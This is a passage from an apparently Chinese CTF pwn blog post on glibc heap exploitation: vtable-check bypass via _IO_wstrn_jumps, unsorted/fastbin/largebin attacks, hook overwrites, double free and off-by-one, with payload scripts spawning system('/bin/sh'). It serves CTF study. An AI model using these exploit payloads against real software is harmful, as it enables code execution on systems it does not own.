title="原理"></a>原理</h6><p><strong>绕过虚表校验</strong></p><p>其实就是对 <code>house of orange</code> 在 <code>libc2.24</code> 里面的再利用。 在 <code>libc2.24</code> 里对 <code>vtable</code> 进行了校验。</p><p>对 <code>vtable</code> 进行校验的函数是 <code>IO_validate_vtable</code></p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/thonsun/images/img/20201216172501.png" alt=""></p><p>就是保证 <code>vtable</code> 要在 <code>__stop___libc_IO_vtables</code> 和 <code>__start___libc_IO_vtables</code> 之间。</p><p>这里的目标就是 <code>_IO_wstrn_jumps</code> ，这个也是一个 <code>vtable</code> ，能够满足 <code>IO_validate_vtable</code>的校验。</p><p>在 <code>_IO_wstrn_jumps</code> 有一个有趣的函数 <code>IO_wstr_finish</code> ， 位于 <strong>libc.symbols[‘_IO_wstrn_jumps’] + 0x10</strong></p><pre><code>void __fastcall IO_wstr_finish(_IO_FILE_2 *fp, int dummy){  _IO_FILE_plus *fp_; // rbx  wchar_t *io_buf_base; // rdi  fp_ = fp;  io_buf_base = fp-&gt;_wide_data-&gt;_IO_buf_base;  if ( io_buf_base &amp;&amp; !(fp_-&gt;file._flags2 &amp; 8) )    (fp_[1].file._IO_read_ptr)(io_buf_base, *&amp;dummy); // call    qword ptr [fp+0E8h]  fp_-&gt;file._wide_data-&gt;_IO_buf_base = 0LL;  _GI__IO_wdefault_finish(fp_, 0);}</code></pre><p>我们把 <code>fp-&gt;_wide_data</code> 改成 <code>fp</code> ， 然后设置 <code>fp-&gt;_IO_buf_base</code> 设置为 <code>/bin/sh</code> 的地址，<code>fp_[1].file._IO_read_ptr</code> ( <strong>fp+0xe8</strong> ) 改成 <code>system</code> 的地址，其他字段根据 <code>check</code> 设置好以便过掉检查， 之后调用该函数就会 <code>system('/bin/sh')</code></p><h6 id="利用方案举例"><a href="#利用方案举例" class="headerlink" title="利用方案举例"></a>利用方案举例</h6><p>以 <strong>34c3ctf-300</strong> 为例， 程序限制只能分配 <code>0x310</code> 的 <code>chunk</code>， 这里利用 <code>unsorted bin</code> 遍历的缺陷，伪造了一个 <code>0x60</code> 的 <code>smallbin</code> ，为后续做准备。</p><ul><li>首先分配 4个 <code>0x310</code> 的 <code>chunk （A X B K）</code> ，释放 <code>A , B</code> 此时 <code>A , B</code> 均进入 <code>unsorted bin</code> ,并且通过<code>bk</code> 链接起来</li><li>修改 <code>A-&gt;bk</code> 为 <code>fake_bin</code> 的地址，并且 设置 <strong>fake_bin-&gt;size=0x61 and fake_bin-&gt;bk = B</strong>, 此时 <code>unsorted bin</code> 的链表其实<strong>有 3 项</strong>。</li><li>分配 一个 <code>0x310</code> 的 <code>chunk</code> ，此时 A 位于链表首部，且大小刚好，分配 A ，并且 把 fake_bin 置于链表首部</li><li>再次<strong>分配</strong> 一个 <code>0x310</code> 的 <code>chunk</code> ， 此时 <strong>fake_bin 位于链表首部</strong>，大小不够于是把 fake_bin 放到 smallbin[4] , 然后继续遍历 ，分配到 <code>B</code>， 至此 在 <strong>smallbin[4] 就存有 fake_bin 的地址</strong></li></ul><p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20180423214605-ab304228-46fc-1.png" target="_blank" rel="noopener"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/thonsun/images/img/20201216172515.png" alt=""></a></p><p>fake_bin 的 内容为 （从 chunk 的开始地址开始</p><pre><code>payload = p64(0xfbad2084)    #伪造的 File 结构体的开始，fp-&gt;_flagpayload += p64(0x61)payload += p64(0xb00bface)  payload += p64(B_addr) # bk ，设置为 B 的地址payload += p64(0x0)            # fp-&gt;_IO_write_basepayload += p64(libc_base + sh_addr)     # fp-&gt;_IO_write_ptr payload += p64(libc_base + sh_addr)     # fp-&gt;wide_data-&gt;buf_basepayload += "A"*60payload += p64(0x0)            # fp-&gt;_flags2payload += "A"*36payload += p64(fake_bin)    # fp-&gt;_wide_data ，设置为 fake_bin, 复用 fake_binpayload += "A"*24payload += p64(0x0)            # fp-&gt;_modepayload += "A"*16payload += p64( libc.symbols['_IO_wstrn_jumps'] + 0x10 -0x18) # fake vtablepayload += "A"*8payload += p64(libc_base + libc.symbols['system'])       # ((_IO_strfile *) fp)-&gt;_s._free_buffer</code></pre><ul><li>然后利用 <code>unsorted bin attack</code> 修改 <code>__IO_list_all</code> 为 <code>main_arean+88</code></li><li>触发 <code>abort</code> （<strong>malloc_printerr内部会调用</strong>）， 就会触发 _<code>IO_flush_all_lockp</code> ,根据 <code>__IO_list_all</code>和 <code>__chain</code> ，遍历调用 <code>_IO_OVERFLOW (fp, EOF)</code> ( 其实就是 <strong>(fp-&gt;vtable + 0x18)(fp, EOF)</strong></li><li><code>___IO_list_all-&gt;_chain</code> 位于 <code>smallbin[4]</code> ，所以遍历第二次可以对 <code>fake_bin</code> 进行 <code>_IO_OVERFLOW (fp, EOF)</code>，此时就会调用 <strong>IO_wstr_finish</strong>， 此时 fake_bin 中的相关数据已经设置好，最后会执行 <strong>system(“/bin/sh”)</strong></li></ul><p><strong>参考</strong><br><a href="http://blog.rh0gue.com/2017-12-31-34c3ctf-300/" target="_blank" rel="noopener">34c3ctf-300</a><br><a href="http://blog.hac425.top/2018/01/13/pwn_with_file_part4.html" target="_blank" rel="noopener">Pwn with File结构体 四</a></p><h5 id="组合-fastbin-attack"><a href="#组合-fastbin-attack" class="headerlink" title="组合 fastbin attack"></a>组合 fastbin attack</h5><h6 id="方案一"><a href="#方案一" class="headerlink" title="方案一"></a>方案一</h6><ul><li>把 <code>bk</code> 改成 <code>global_max_fast-0x10</code> 触发 <code>unsorted bin attack</code> 后， <code>global_max_fast</code>会被修改成一个很大的值（指针），所以之后的 内存 分配 和 释放 都会按 <code>fastbin</code> 来</li><li>之后看情况进行 <strong>伪fastbin attack</strong></li></ul><h6 id="方案二"><a href="#方案二" class="headerlink" title="方案二"></a>方案二</h6><p>把 <code>bk</code> 改成 <strong>libc.symbols[‘__free_hook’] - 0x50</strong> 触发 <code>unsorted bin attack</code> 后， <code>free_hook</code> 前面就会出现 <code>p64(0x7f)</code> ,之后就可以通过 <code>fastbin attack</code> 修改 <code>free_hook</code></p><p><strong>参考</strong><br><a href="http://brieflyx.me/2016/ctf-writeups/0ctf-2016-zerostorage/" target="_blank" rel="noopener">0ctf-2016-zerostorage</a></p><h5 id="结合-largebin-和-dl-open-hook"><a href="#结合-largebin-和-dl-open-hook" class="headerlink" title="结合 largebin 和 _dl_open_hook"></a>结合 largebin 和 _dl_open_hook</h5><h6 id="原理-4"><a href="#原理-4" class="headerlink" title="原理"></a>原理</h6><p>在 遍历 <code>unsoted bin</code> 时， 是通过 bk 指针 进行遍历</p><pre><code>for (;; )    {      int iters = 0;      //victim = unsorted_chunks (av)-&gt;bk      while ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av)) // 遍历 unsorted bin        {          bck = victim-&gt;bk;        ............        ............        ............          /* remove from unsorted list */          unsorted_chunks (av)-&gt;bk = bck;  //unsorted_chunks (av)-&gt;bk =  victim-&gt;bk-&gt;bk          bck-&gt;fd = unsorted_chunks (av);          ......          ......          ......        }</code></pre><p>所以通过修改 <code>bk</code> 来伪造 <code>unsorted bin</code> 是可行的</p><p>同时在 遍历 <code>unsorted bin</code> 把 <code>chunk</code> 放入 <code>largebin</code> 的过程中， <strong>也没有什么检查</strong>，于是可以利用 把 <code>chunk</code>放入 <code>largebin</code> 的过程 <strong>往 任意地址写入 chunk 的地址</strong>。</p><p><strong>PS: 因为要伪造 unsorted bin ，需要我们可以拿到 heap 的基地址</strong></p><h6 id="大体的思路"><a href="#大体的思路" class="headerlink" title="大体的思路"></a>大体的思路</h6><ul><li>在堆上通过修改 <code>unsorted bin</code> 的 <code>bk</code> 指针 伪造几个 <code>unsorted bin(A B C D)，(0x400, 0x30, 0x420, 0x30)</code></li><li>分配 <code>0x30</code> , <strong>A 进入 largebin, B 被分配</strong></li><li>修改 <strong>A-&gt;bk = _dl_open_hook - 0x10 and A-&gt;bk_nextsize = _dl_open_hook - 0x20</strong></li><li>分配 <code>0x30</code> , <code>C</code> 进入 <code>largebin</code>, 会导致 <code>A-&gt;bk-&gt;fd = C , A-&gt;bk_nextsize-&gt;fd_nextsize = C</code> （其实就是 <strong>*_dl_open_hook = C</strong>)</li><li>此时<code>_dl_open_hook</code> 指针被改成 <code>C</code> 的地址， 然后在 <code>C</code> 中设置 <strong>p64(libc.symbols[‘__libc_dlsym’] + 4)+p64(one_gadget)+p64(one_gadget)</strong> ， <strong>伪造 dl_open_hook 结构体。</strong></li><li>后面的执行过程会调用 <code>_dl_open_hook</code>， 就会调用 <code>__libc_dlsym + 4</code>, 这里面会 <strong>跳转到 dl_open_hook结构体偏移 8 的值</strong>处 , 也就是 <code>one_gadget</code> 的地址</li></ul><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/thonsun/images/img/20201216172532.png" alt=""></p><p><strong>参考</strong><br><a href="https://twitter.com/Yannayli/status/980836566368210946" target="_blank" rel="noopener">0ctf 2018 babyheap challenge exploit</a></p><h2 id="特定写权限的利用"><a href="#特定写权限的利用" class="headerlink" title="特定写权限的利用"></a>特定写权限的利用</h2><h3 id="可写-main-arean"><a href="#可写-main-arean" class="headerlink" title="可写 main_arean"></a>可写 main_arean</h3><p>通过一些 <code>fastbin</code> 攻击， 我们可以分配到 <code>main_arean</code>， 此时一般都是改写 <code>main_arean-&gt;top</code></p><h4 id="转换为写-malloc-hook"><a href="#转换为写-malloc-hook" class="headerlink" title="转换为写 __malloc_hook"></a>转换为写 __malloc_hook</h4><p><strong>malloc_hook -0x10</strong> 处存放的是指针，值很大，修改 <strong>main_arean-&gt;top 到这里</strong>，然后控制程序 使得通过 <code>top_chunk</code> 分配， 就可以分配到 <code>malloc_hook</code></p><h4 id="转换为写-free-hook"><a href="#转换为写-free-hook" class="headerlink" title="转换为写 __free_hook"></a>转换为写 __free_hook</h4><p>在 <code>free_hook-0xb58</code> 处存放的也是一些地址，修改 <strong>main_arean-&gt;top 到这里</strong>，然后控制程序 使得通过 <code>top_chunk</code> 分配几次内存（一次分配太多，会触发 <code>sysmalloc</code>, <strong>可以一次分配 0x90 多分配几次</strong>），我们就可以分配到 <code>free_hook</code></p><h3 id="可写-malloc-hook"><a href="#可写-malloc-hook" class="headerlink" title="可写 __malloc_hook"></a>可写 __malloc_hook</h3><h4 id="直接写one-gadget"><a href="#直接写one-gadget" class="headerlink" title="直接写one_gadget"></a>直接写one_gadget</h4><p>写入 <code>one_gadget</code> ，不过触发的时候，用 <code>malloc_printerr</code> 来触发 <code>malloc</code></p><p>此时用下面这样的 <code>one_gadget</code> <strong>[rsp+0x50]</strong></p><pre><code>0xef6c4 execve("/bin/sh", rsp+0x50, environ)constraints:  [rsp+0x50] == NULL</code></pre><p>这样更稳定，成功率也高</p><h4 id="通过-realloc-hook-中转"><a href="#通过-realloc-hook-中转" class="headerlink" title="通过 __realloc_hook 中转"></a>通过 __realloc_hook 中转</h4><p><code>__malloc_hook</code> 和 <code>__realloc_hook</code> 是相邻的， 且 <code>__realloc_hook</code> 在 <code>__malloc_hook</code> 的前面，所以基本上可以同时修改它们。</p><p>利用 <code>one_gadget</code> 时，对于<strong>栈的条件会有一些要求</strong>，利用 <code>realloc</code> 函数内部的 跳转 到 <code>__realloc_hook</code> 之前的栈操作，加上栈中原有的数据，可以对栈进行跳转，以满足 <code>one_gadget</code> 的要求</p><pre><code>realloc         proc near               ; DATA XREF: LOAD:0000000000006BA0↑opush    r15             push    r14push    r13push    r12mov     r13, rsipush    rbppush    rbxmov     rbx, rdisub     rsp, 38hmov     rax, cs:__realloc_hook_ptr  #取出 __realloc_hook 指针mov     rax, [rax]test    rax, raxjnz     loc_848E8test    rsi, rsijnz     short loc_846F5test    rdi, rdijnz     loc_84960</code></pre><p>代码中的 <code>push</code> 以及 <code>sub rsp, 38h</code> 都可用于对栈进行调整。</p><p>可以收先把 <code>__malloc_hook</code> 设置为 <code>0x6363636363636363</code>， 当程序断下来后，<strong>查看栈的情况，然后选择跳转的位置</strong>。</p><p>最后把 <code>malloc_hook</code> 设置为选择好的位置，<code>realloc_hook</code> 设置为 <code>one_gadget</code>, 触发 <code>malloc</code></p><h3 id="可写-free-hook"><a href="#可写-free-hook" class="headerlink" title="可写 __free_hook"></a><strong>可写 __free_hook</strong></h3><h4 id="直接写one-gadget-1"><a href="#直接写one-gadget-1" class="headerlink" title="直接写one_gadget"></a>直接写one_gadget</h4><h4 id="改成-system-函数的地址"><a href="#改成-system-函数的地址" class="headerlink" title="改成 system 函数的地址"></a>改成 system 函数的地址</h4><p>然后 释放掉 内容为 <code>/bin/sh\x00</code> 的 <code>chunk</code></p><h3 id="可写-std-结构体"><a href="#可写-std-结构体" class="headerlink" title="可写 std* 结构体"></a>可写 std* 结构体</h3><pre><code>std*` 类结构体 定义是 `_IO_FILE_plus` ， `64` 为大小为 `0xe0</code></pre><h4 id="修改-vtable指针"><a href="#修改-vtable指针" class="headerlink" title="修改 vtable指针"></a>修改 vtable指针</h4><h5 id="libc-lt-2-23"><a href="#libc-lt-2-23" class="headerlink" title="libc <= 2.23"></a>libc &lt;= 2.23</h5><p><code>_IO_FILE_plus</code> 的最后一个字节就是 <code>vtable</code> 指针，修改 <code>vtable</code> 指针到一个可控数据可控的地址，在地址处填上 <code>one_gadget</code> , 然后在调用一些输入输出函数时，就会触发。</p><p>如果是堆类题目可以 <strong>修改vtable指针到 heap,</strong> 或者如果是通过 <code>fastbin 攻击</code> 分配到了 <code>std*</code> ， 那么可以修改 <strong>vtable 到 std* 的相应位置</strong>， 只要保证 <strong>马上要被调用的函数指针我们可控</strong> 即可</p><h5 id="libc-gt-2-23"><a href="#libc-gt-2-23" class="headerlink" title="libc > 2.23"></a>libc &gt; 2.23</h5><p>一般结合 <code>unsorted bin attack</code> ，改到 <strong>libc.symbols[‘_IO_wstrn_jumps’] + 0x10 -0x18</strong>， 然后触发 <code>abort</code> 会调用 <code>_IO_OVERFLOW (fp, EOF)</code> 时就会调用 <code>IO_wstr_finish(fp, EOF)</code> ，通过设置 <code>fp</code> 的数据，就可以 <code>system("/bin/sh")</code>.</p><blockquote><p>(: fp为文件结构体的指针</p></blockquote><h2 id="Double-Free"><a href="#Double-Free" class="headerlink" title="Double Free"></a>Double Free</h2><h3 id="原理-5"><a href="#原理-5" class="headerlink" title="原理"></a>原理</h3><p>程序把指针 <code>free</code> 之后没有对指针进行清空， 出现了 <strong>悬垂指针</strong>。后续还可以对该指针进行 <code>free</code> 操作。</p><h3 id="利用-1"><a href="#利用-1" class="headerlink" title="利用"></a>利用</h3><p><strong>基于 pwnable.tw 中的 secretgard</strong></p><h4 id="信息泄露"><a href="#信息泄露" class="headerlink" title="信息泄露"></a>信息泄露</h4><p>总的思路 : <strong>大块 拆成 小块</strong></p><ul><li>分配一个 <code>0x120</code> 的 <code>chunk</code>, <code>p1</code> 指向 它。 然后释放掉他</li><li>分配两个 <code>0x90</code> 的 <code>chunk</code> 重用刚刚 <code>free</code> 掉的 <code>chunk</code>, 可以发现此时 <code>p1==p2</code></li><li>此时再次 <code>free(p1)</code>, 在 <code>p2-&gt;fd</code> 和 <code>p2-&gt;bk</code> 会写入 <code>main_arean</code> 的地址（<code>free</code> 之后大小大于 <code>fastbin</code>的范围，进入 <code>unsorted bin</code>)</li><li>然后打印 <code>p2</code> 的内容就可以拿到 <code>libc</code> 的地址</li></ul><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/thonsun/images/img/20201216172556.png" alt=""></p><h4 id="Overlap-chunk-unlink"><a href="#Overlap-chunk-unlink" class="headerlink" title="Overlap chunk + unlink"></a>Overlap chunk + unlink</h4><p>总的思路 : <strong>小块 融合成 大块</strong></p><ul><li>首先分配两个 <code>0x90</code> 的 <code>chunk (p0, p1)</code> ，然后释放掉，会进行合并，形成 一个 <code>0x120</code> 的 <code>unsorted bin</code></li><li>然后分配一个 <code>0x120</code> 的 <code>chunk (p2)</code> , 则 <code>p0=p2</code> ， 此时 <code>p0</code> 所在的 <code>chunk</code> 可以包含 <code>p1</code> 的 <code>chunk</code></li><li>然后在 <code>p0</code> 所在的 <code>chunk</code> 伪造一个 <code>free chunk</code>， 设置好 <code>fd</code> 和 <code>bk</code> , 然后释放 <code>p1</code> 触发 <code>unlink</code></li></ul><pre><code>add(0x80) # pzadd(0x80) # p0add(0x80) # p1add(0x80) # pxdel(1)del(2)add(0x110) # p2payload = p64(0)       # p1's 用户区payload += p64(0x81)   # fake chunk sizepayload += p64(ptr - 0x18)  # fd, ptr---&gt;p0 + header_sizepayload += p64(ptr - 0x10)  # bkpayload += 'a' * (0x80 - len(payload))payload += p64(0x80)  # pre_size ----- 下一个 chunk p1payload += p64(0x80)  # size 设置 pre_inused=0payload += 'b' * 0x70payload += p64(0x80)payload += p64(0x21)  # size 设置 pre_inused=1 ---- p1--&gt;next_chunk, 绕过 double free 检查edit(2,payload)   # fake chunk# p1 所在 chunk-&gt;pre_inused=0, 向前合并# 触发 fake chunk 的 unlink# ptr---&gt;p0 + header_size, 实现 *ptr = ptr-0x18del(1)</code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/thonsun/images/img/20201216172614.png" alt=""></p><h4 id="修改-malloc-hook"><a href="#修改-malloc-hook" class="headerlink" title="修改 __malloc_hook"></a>修改 __malloc_hook</h4><p>一般 <code>malloc</code>触发的方式，<code>one_gadgets</code> 由于限制条件不满足，很可能会失败</p><p>可以使用 <code>malloc_printerr</code> 触发， 此时恰好 <strong>[esp+0x50]=0</strong></p><p><strong>__malloc_hook - 0x23 + 0x8</strong> 的 内容为 <strong>0x000000000000007f</strong> ， 可以用来绕过 <code>fastbin</code> 分配的检查<br>可以 <code>gdb + hexdump</code> 找到类似的位置来伪造 <code>fastbin</code></p><h5 id="Overlap-Chunk-Fastbin-Attack"><a href="#Overlap-Chunk-Fastbin-Attack" class="headerlink" title="Overlap Chunk + Fastbin Attack"></a>Overlap Chunk + Fastbin Attack</h5><p>总的思路 : <strong>小块 融合成 大块， 分配大块操纵小块</strong></p><ul><li>首先分配两个 <code>0x90</code> 大小 的 <code>chunk (p0, p1)</code></li><li>释放掉它们，合并成一个 <code>0x120</code> 的 <code>unsorted bin</code></li><li>分配 <code>0x120</code> 的 <code>chunk (p3)</code> , <strong>p3==p1</strong>, 而且此时通过 <code>p3</code> 可以修改 <strong>p2 的 chunk</strong> ，<strong>Overlap Chunk完成</strong></li><li>修改 <code>p-&gt;size = 0x71</code> <strong>p = p2-0x10</strong>， <code>p</code>为 <code>p2</code> 所在<strong>chunk的地址</strong></li><li>修改 <strong>p + 0x70</strong> 为 <strong>p64(0x70) + p64(0x41)</strong> , 设置 <strong>pre_inused =1</strong>, 使得后面 <strong>free(p2)</strong> 绕过<code>double free</code>检测</li><li>此时 <code>free(p2)</code> , <code>p2</code> 进入 <code>0x70</code> 大小的 <code>fastbin</code></li><li>再次 <code>free(p1)</code>（此时 <code>p1</code> 所在 <code>chunk</code> 的 <code>size</code> 为 <code>0x120</code>)， 得到一个 <code>0x120</code> 的 <code>unsorted bin</code></li><li>再次分配 <code>0x120</code> 的 <code>chunk (p4)</code> , <strong>p4==p1</strong></li><li>通过 <code>p4</code> 可以修改 <code>p2</code> 指向的 <code>chunk</code> 的 <code>fd</code> 为 <code>__malloc_hook - 0x23</code> (此时 <code>p2</code> 的 <code>chunk</code> 已经在 <code>0x70</code> 的 <code>fastbin</code> 里面)</li><li><strong>Fastbin Attack</strong> 开始，分配两次，可以得到 <strong>p6 = __malloc_hook -0x13</strong></li><li>然后修改 <strong>__malloc_hook</strong></li></ul><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/thonsun/images/img/20201216172635.png" alt=""></p><h5 id="Overlap-chunk-fastbin-attack-修改-top-chunk"><a href="#Overlap-chunk-fastbin-attack-修改-top-chunk" class="headerlink" title="Overlap chunk + fastbin attack + 修改 top chunk"></a>Overlap chunk + fastbin attack + 修改 top chunk</h5><ul><li>首先通过上面的 <code>Overlap chunk</code> 我们可以修改 <code>p2</code> 的 <code>chunk</code> 的内容</li><li>修改 chunk-&gt;size = 0x41 , <strong>注意设置 好 chunk-&gt;nextchunk 的 pre_inused 位 避免过不了 double free 检查</strong></li><li><code>free(p2)</code> , 此时 <code>p2</code> 的 <code>chunk</code> 进入 <code>0x40</code> 的 <code>fastbin</code></li><li><code>free(p3)</code> ，<code>malloc(0x110)</code> , 可以再次修改 <code>p2 chunk</code> , 修改 <strong>chunk-&gt;size = 0x41 and chunk-&gt;fd = 0x71</strong></li><li><code>malloc(0x30)</code> ，此时 <strong>main_arean-&gt;fastbinY 中会有一项 的 值 为 p64(0x71)</strong></li><li>再次 <code>free(p3)</code>， <code>malloc(0x110)</code>，修改 <strong>p2 chunk, chunk-&gt;size = 0x71</strong></li><li><code>free(p2)</code> , 此时 <code>p2</code> 的 <code>chunk</code> 进入 <code>0x70</code> 的 <code>fastbin</code></li><li><code>free(p3)</code>， <code>malloc(0x110)</code>，修改 <code>p2 chunk</code>, 设置<strong>chunk-&gt;size = 0x71 and chunk-&gt;fd = 0x40 fastbinY 的地址附近</strong></li><li>分配两次 <code>0x70</code> 的 <code>chunk</code>, 可以修改 <strong>main_arean-&gt;top 为 __malloc_hook -0x10 (这里存的指针，值很大)</strong></li><li>然后使用 <code>top chunk</code> 进行分配， 就可以拿到 <code>__malloc_hook</code></li></ul><h5 id="Fastbin-dup-Fastbin-Attack"><a href="#Fastbin-dup-Fastbin-Attack" class="headerlink" title="Fastbin dup+ Fastbin Attack"></a>Fastbin dup+ Fastbin Attack</h5><p>在把释放的块放进<code>fastbin</code> 时，会检测也 <strong>只检测</strong> 当前 <strong>free 的 chunk 和 fastbin 第一项</strong> 是否相同 ， 如果相同则报 <code>double free</code> 的错误。</p><ul><li>首先 分配 <code>2</code> 个 <code>0x70</code> 的 <code>chunk , p0, p1</code></li><li>释放 <code>p0</code>, <code>p0</code> 进入 <code>0x70</code> 大小的 <code>fastbin</code>, 此时 <code>p0</code> 为第一项</li><li>释放 <code>p1</code>, <code>p1</code> 进入 <code>0x70</code> 大小的 <code>fastbin</code>, 此时 <code>p1</code>为第一项， <strong>p1-&gt;fd = p0</strong></li><li>再次释放 <code>p0</code>, 此时 <code>p1</code>为 <code>fastbin</code> 的 第一项，<strong>不会报错</strong>，<code>p0</code> 进入 <code>fastbin</code>, 此时 <code>p0</code> 为第一项</li><li>分配 <code>0x70</code> 的 <code>chunk p2</code>, <strong>p2==p0</strong>, 设置 <strong>p2-&gt;fd = __malloc_hook - 0x23</strong>，<strong>其实就是修改 p0-&gt;fd</strong></li><li>此时 <strong>__malloc_hook - 0x23</strong> 成为 <strong>0x70 fastbin</strong> 的第 <strong>3</strong> 项</li><li>分配三个 <strong>0x70</strong> 的 <strong>chunk p3, p4, p5</strong>， <strong>p5==__malloc_hook - 0x13</strong></li><li>通过 <code>p5</code> 修改 <code>__malloc_hook</code></li></ul><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/thonsun/images/img/20201216172650.png" alt=""></p><h4 id="修改-free-hook"><a href="#修改-free-hook" class="headerlink" title="修改 __free_hook"></a>修改 __free_hook</h4><p>因为 <code>free_hook</code> 上方很大一块空间都是 <code>\x00</code>, 所以使用 <code>fastbin attack</code> 直接来修改它基本不可能，可以迂回一下，在 <code>free_hook-0xb58</code> 位置会存一些指针，我们通过 <code>fastbin attack</code> 修改 <code>main_arean-&gt;top</code>, 到这里然后多用 <code>top_chunk</code> 分配几次，就可以分配到 <code>free_hook</code>, 然后该 <code>free_hook</code> 为 <code>system</code> 。</p><h5 id="Fastbin-dup-Fastbin-Attack-修改-main-arean-gt-top"><a href="#Fastbin-dup-Fastbin-Attack-修改-main-arean-gt-top" class="headerlink" title="Fastbin dup + Fastbin Attack 修改 main_arean->top"></a>Fastbin dup + Fastbin Attack 修改 main_arean-&gt;top</h5><ul><li>首先利用 <code>Fastbin dup</code> 我们可以拿到实现修改 <code>fastbin</code> 中的块的 <code>fd</code></li><li>由于在 <code>fastbin</code> 中 如果为空，其在 <code>main_arean-&gt;fastbinY</code> 里面对应的值为 <code>0x0</code> , 而堆的地址基本 是 <code>0x5x</code> 开头的（其在内存就是 <code>xx xx..... 5x</code>)， 此时如果在 <code>main_arean-&gt;fastbinY</code> 的 相邻项为 <code>0x0</code> , 就会出现 <code>5x 00 00 00...</code> , 所以就可以出现 <code>0x000000000000005x</code> ，可以把它作为 <code>fastbin</code> 的 <code>size</code> 进行 <code>fastbin attack</code> ，<strong>不过作为 fastbin attack 的 size 不能 为 0x55</strong></li><li>然后我们就可以修改 <code>main_arean-&gt;top</code> 为 <code>free_hook-0xb58</code></li><li>之后多分配几次， 既可以分配到 <code>free_hook</code></li><li>改 <code>free_hook</code> 为 <code>system</code></li><li><code>free</code> 掉一个 内容为 <code>/bin/sh\x00</code> 的块</li></ul><h4 id="修改-IO-FILE-plus-结构体-的-vtable"><a href="#修改-IO-FILE-plus-结构体-的-vtable" class="headerlink" title="修改 _IO_FILE_plus 结构体 的 vtable"></a>修改 _IO_FILE_plus 结构体 的 vtable</h4><p>在 <code>libc 2.24</code> 以下可修改 <code>_IO_FILE_plus</code> 的 <code>vtable</code> 指针到我们可控的位置，进行虚表的伪造。</p><p><strong>参考</strong><br><a href="http://tacxingxing.com/2018/02/20/pwnabletw-secretgarden/" target="_blank" rel="noopener">Pwnable.tw secretgard</a></p><h2 id="off-by-one"><a href="#off-by-one" class="headerlink" title="off by one"></a>off by one</h2><h3 id="原理-6"><a href="#原理-6" class="headerlink" title="原理"></a>原理</h3><p>在一些情况下我们可以往指定的 <code>buf</code> 中多写入 <code>1</code> 个字节的数据 ，这就是 <code>off by one</code> . 这种情况下可以进行利用的原因在于 调用 <code>malloc</code> 分配内存是要 对齐的， <strong>64 位 0x10 字节对齐， 32 位 8 字节对齐</strong>，下面均以64位进行说明。<strong>如果 malloc(0x28) 则会分配 0x30 字节的 chunk, 除去 0x10 的首部， 我们有 0x20 然后加上下一个 chunk 的 pre_size ，我们就有 0x28 了</strong>， 我们知道 <code>pre_size</code> 后面紧跟着就是 <code>size</code> ，所以利用 <code>off by one</code> 可以 修改 下一个 <code>chunk</code> 的 <code>size</code> 字段，同时 在 <strong>glibc 中的内存管理 非常依赖这个 size 字段</strong>，所以我们可以利用它做一些有趣的事情。</p><p>所以<strong>当程序中有类似这种不对齐的分配， 就要小心 off by one</strong></p><h3 id="利用-2"><a href="#利用-2" class="headerlink" title="利用"></a>利用</h3><h4 id="普通off-by-one"><a href="#普通off-by-one" class="headerlink" title="普通off by one"></a>普通off by one</h4><p>在这种情况下，溢出的那个字节不受限制，此时的利用思路就是，多分配几个 <code>chunk</code> ，然后利用第一个来溢出修改第二个 <code>chunk</code> 的 <code>size</code>（<strong>改大</strong>）, 然后 <code>free(chunk_2)</code> , 就可以 <code>overlap chunk 3</code>, 要非常注意 in_used 位的设置</p><h5 id="溢出-used-状态的-chunk"><a href="#溢出-used-状态的-chunk" class="headerlink" title="溢出 used 状态的 chunk"></a>溢出 used 状态的 chunk</h5><p>在 <code>free</code> 时可以获得包含 <code>chunk</code> 的 <code>unsorted bin</code></p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/thonsun/images/img/20201216172707.png" alt=""></p><h5 id="溢出-free-状态的-chunk"><a href="#溢出-free-状态的-chunk" class="headerlink" title="溢出 free 状态的 chunk"></a><strong>溢出 free 状态的 chunk</strong></h5><p>因为<code>malloc</code> 再分配内存时 不会校验 <code>unsorted bin</code> 的 <code>size</code> 是否被修改</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/thonsun/images/img/20201216172722.png" alt=""></p><p><a href="http://www.contextis.com/documents/120/Glibc_Adventures-The_Forgotten_Chunks.pdf" target="_blank" rel="noopener">Glibc_Adventures-The_Forgotten_Chunks</a></p><p><strong>基于 0ctf 2018 babyheap</strong></p><h5 id="信息泄露-1"><a href="#信息泄露-1" class="headerlink" title="信息泄露"></a>信息泄露</h5><ul><li>首先malloc 4 个 chunk, malloc(0x18)</li></ul><pre><code>allocate(0x18)  # 0, 0x20 chunkallocate(0x38)  # 1, 0x40 chunk----&gt; 溢出修改为 0x91allocate(0x48)  # 2, 0x50 chunkallocate(0x18)  # 3, 0x20 chunk</code></pre><ul><li><p>然后在 <strong>chunk 0 溢出一个字节，修改 chunk 1 的 size 位 为 0x91 (原来应该为 0x41)</strong>，这样一来 通过 <code>chunk 1</code> 索引到的 下一个 <code>chunk</code> 就是 <strong>p + 0x90 = chunk 3</strong> (设<code>p</code> 为 <code>chunk 1</code>的地址)</p></li><li><p>此时 释放 <code>chunk 1</code>, <code>libc</code>会根据下一个 <code>chunk</code> (<strong>这里也就是 chunk3</strong>) 的 